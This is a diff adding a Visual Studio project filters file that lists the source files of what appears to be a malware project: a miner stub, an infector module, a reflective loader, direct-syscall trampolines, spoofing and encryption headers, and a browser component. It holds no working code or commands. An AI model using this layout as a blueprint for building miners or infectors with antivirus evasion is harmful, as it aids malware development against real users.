@@ -1,0 +1,95 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Security">
+      <UniqueIdentifier>{e9b17a09-08f3-4c0e-a078-dea598f69328}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Depencies">
+      <UniqueIdentifier>{9b4b39c8-204c-4a9d-ba8e-5e619ddf8fae}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="ExInfector">
+      <UniqueIdentifier>{ab4275cb-2fb4-408f-a3f1-e85a57fba79f}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Browser">
+      <UniqueIdentifier>{d24cb106-52a5-41af-8673-a173807b12ac}</UniqueIdentifier>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="LuckyMinerStub.cpp" />
+    <ClCompile Include="wnetwrap.cpp" />
+    <ClCompile Include="DLCK\deadlock.cpp">
+      <Filter>Depencies</Filter>
+    </ClCompile>
+    <ClCompile Include="deadlock_wrapper.cpp">
+      <Filter>Depencies</Filter>
+    </ClCompile>
+    <ClCompile Include="BRSHt\reflective_loader.c">
+      <Filter>Browser</Filter>
+    </ClCompile>
+    <ClCompile Include="BRSHt\syscalls.cpp">
+      <Filter>Browser</Filter>
+    </ClCompile>
+    <ClCompile Include="base64.cpp">
+      <Filter>Browser</Filter>
+    </ClCompile>
+    <ClCompile Include="Fokos.cpp">
+      <Filter>Browser</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="Encrypt.h">
+      <Filter>Security</Filter>
+    </ClInclude>
+    <ClInclude Include="ExInfector\commdef.h">
+      <Filter>ExInfector</Filter>
+    </ClInclude>
+    <ClInclude Include="LI.h">
+      <Filter>Security</Filter>
+    </ClInclude>
+    <ClInclude Include="Spoof.h">
+      <Filter>Security</Filter>
+    </ClInclude>
+    <ClInclude Include="SpoofFuncs.h">
+      <Filter>Security</Filter>
+    </ClInclude>
+    <ClInclude Include="Functions.h">
+      <Filter>Depencies</Filter>
+    </ClInclude>
+    <ClInclude Include="Infector.h">
+      <Filter>Depencies</Filter>
+    </ClInclude>
+    <ClInclude Include="Utils.h">
+      <Filter>Depencies</Filter>
+    </ClInclude>
+    <ClInclude Include="wnetwrap.h" />
+    <ClInclude Include="base64.h">
+      <Filter>Depencies</Filter>
+    </ClInclude>
+    <ClInclude Include="lib_SK5.h">
+      <Filter>Depencies</Filter>
+    </ClInclude>
+    <ClInclude Include="DLCK\deadlock.h">
+      <Filter>Depencies</Filter>
+    </ClInclude>
+    <ClInclude Include="DLCK\ntapi.h">
+      <Filter>Depencies</Filter>
+    </ClInclude>
+    <ClInclude Include="deadlock_wrapper.h">
+      <Filter>Depencies</Filter>
+    </ClInclude>
+    <ClInclude Include="BRSHt\reflective_loader.h">
+      <Filter>Browser</Filter>
+    </ClInclude>
+    <ClInclude Include="BRSHt\syscalls.h">
+      <Filter>Browser</Filter>
+    </ClInclude>
+    <ClInclude Include="Fokos.h">
+      <Filter>Browser</Filter>
+    </ClInclude>
+  </ItemGroup>
+  <ItemGroup>
+    <MASM Include="BRSHt\syscall_trampoline_x64.asm">
+      <Filter>Browser</Filter>
+    </MASM>
+  </ItemGroup>
+</Project>
